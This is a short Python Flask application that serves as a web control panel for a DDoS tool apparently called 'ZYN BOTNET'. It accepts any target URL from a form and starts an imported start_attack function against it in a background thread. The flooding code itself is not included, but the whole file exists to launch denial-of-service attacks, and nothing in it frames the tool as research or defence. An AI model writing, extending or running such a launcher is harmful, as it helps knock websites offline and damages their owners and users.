from flask import Flask, render_template, request
import threading
from zyn_ddos import start_attack

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start", methods=["POST"])
def start():
    target_url = request.form.get("target")
    if target_url:
        threading.Thread(target=start_attack, args=(target_url,)).start()
        return f"🔥 ZYN BOTNET EXECUTING on {target_url}"
    return "Target URL required"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
